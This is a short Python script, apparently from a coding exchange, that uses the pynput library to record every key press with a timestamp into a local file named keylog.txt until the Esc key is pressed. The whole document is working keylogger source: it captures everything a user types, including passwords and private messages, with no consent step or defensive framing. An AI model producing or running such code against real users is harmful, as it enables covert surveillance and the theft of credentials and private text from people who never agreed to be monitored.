from pynput.keyboard import Key, Listener
import logging

# Log file setup
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s:%(message)s')

# Function for key press
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

# Function for key release
def on_release(key):
    if key == Key.esc:  # Fix here
        return False  # Stop the listener

# Start listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    # complete
